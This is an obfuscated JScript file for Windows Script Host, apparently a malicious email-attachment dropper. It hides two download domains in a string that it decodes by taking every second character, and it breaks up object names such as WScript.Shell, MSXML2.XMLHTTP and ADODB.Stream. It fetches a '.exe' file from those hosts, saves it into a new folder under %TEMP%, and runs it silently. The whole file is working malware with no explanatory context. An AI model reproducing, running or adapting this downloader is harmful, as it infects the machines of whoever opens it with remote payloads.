

function BYVfwNlKw(ehTtOmYEyZw) {
var OZZGDDHT = "iYdf Ws kcbmFAv cript.S vvncLU hell".split(" ");
var NxsgxSkj = WScript.CreateObject(OZZGDDHT[1] + OZZGDDHT[3] + OZZGDDHT[5]);
NxsgxSkj.Run(ehTtOmYEyZw, 0x1, 0x0);
}
function ypOQOEBXw(JzkfA,ETKci,RHPax) {
var Huuxo = "TdxrwP DCr pt.Shell OIQZYSj Scri  %TEMP%\\".split(" ");
var ZYh=((1)?"W" + Huuxo[4]:"")+Huuxo[2];
var Il = WScript.CreateObject(ZYh);
return Il.ExpandEnvironmentStrings(Huuxo[6]);
}
function IZGDRgvn() {
var xLgvSzG = "Sc GGYjsgn r wqFUjrOqb ipting IHYGKfr Tug ile IOfdYyfvvtQiyS System DS UlfRm Obj zPUKYN ect kTSBlLV".split(" ");
return xLgvSzG[0] + xLgvSzG[2] + xLgvSzG[4] + ".F" + xLgvSzG[7] + xLgvSzG[9] + xLgvSzG[12] + xLgvSzG[14];
}
function Nqmc(xuBCR) {
PlqOhkz = WScript.CreateObject(xuBCR);
return PlqOhkz
}
function LLoH(cjMof,RZZyI) {
cjMof.write(RZZyI);
}
function suRs(hMGTp) {
hMGTp.open();
}
function vnqG(hdbPk,wGupv) {
hdbPk.saveToFile(wGupv,653-651);
}
function EbKH(HGUmf,tDYzV,unTIc) {
HGUmf.open(unTIc,tDYzV,false);
}
function bTGc(CfGWL) {
if (CfGWL == 899-699){return true;} else {return false;}
}
function Hxse(KzJoR) {
if (KzJoR > 182893-866){return true;} else {return false;}
}
function WocO(CEqDp) {
var YJJcn="";
for(Z=(739-739); Z < CEqDp.length; Z++)
if (Z % (843-841) != (465-465)) {
YJJcn += CEqDp.substr(Z, 130-129);
}
return YJJcn;
}
function mmlU(GeSuJ) {
GeSuJ.send();
}
function Xzmf(GYbNj) {
return GYbNj.status;
}
function EXQPf(oCFTbj) {
return new ActiveXObject(oCFTbj);
}
function aMmnboA(CBbA) {
CBbA.position=0;
}
function QXPWcYm(eSkE) {
return eSkE.responseBody;
}
var FL="4ujjhaijSayjBgloOgloDfofc.QcooSmu/S6Y9D.QeZx9es?P qiZsMt3h0errOeRaCnVyNb0o4dey0qnqk.uczoomW/z619Z.TeBxteT?Q X?j q?z w?";
var R = WocO(FL).split(" ");
var vzx = ypOQOEBXw("qzTU","fZyMR","mnqSho");
var rCq = EXQPf(IZGDRgvn());
var JuruWB = ("gNmyMpm \\").split(" ");
var fDYA = vzx+JuruWB[0]+JuruWB[1];
try{
rCq.CreateFolder(fDYA);
}catch(Dooxsm){
};
var jRR = "2.XMLH";
var ZKN = (jRR + "TTP" + " rbpEBoP hYHKi XML ream St OzoRIPXT AD qfGhDhH OD").split(" ");
var Kh = true  , UFqY = ZKN[7] + "" + ZKN[9];
var fo = Nqmc("MS"+ZKN[3]+(15130, ZKN[0]));
var ZME = Nqmc(UFqY + "B." + ZKN[5]+(816174, ZKN[4]));
var vKA = 0;
var f = 1;
var hebGfQV = 841549;
var K=vKA;
while (true)  {
if(K>=R.length) {break;}
var uN = 0;
var kOL = ("ht" + " pYAGtCZ tp BvJBb MPdhiBlc :// DstsosM .e xe G ET").split(" ");
try  {
var FjhtT=kOL[0]+kOL[2]+kOL[5];
EbKH(fo,FjhtT+R[K]+f, kOL[9]+kOL[10]); mmlU(fo); if (bTGc(Xzmf(fo)))  {      
suRs(ZME); ZME.type = 1; LLoH(ZME,QXPWcYm(fo)); if (Hxse(ZME.size))  {
uN = 1; aMmnboA(ZME);vnqG(ZME,/*Yv7w23sWeK*/fDYA/*5sLr61kQs5*/+hebGfQV+kOL[7]+kOL[8]); try  {
if (((new Date())>0,7263651888)) {
BYVfwNlKw(fDYA+hebGfQV+/*D2Hi31HTKa*/kOL[7]+kOL[8]/*Xcd296HNaA*/); 
break;
}
}
catch (eM)  {
}; 
}; ZME.close(); 
}; 
if (uN == 1)  {
vKA = K; break; 
}; 
}
catch (eM)  { 
}; 
K++;
}; 

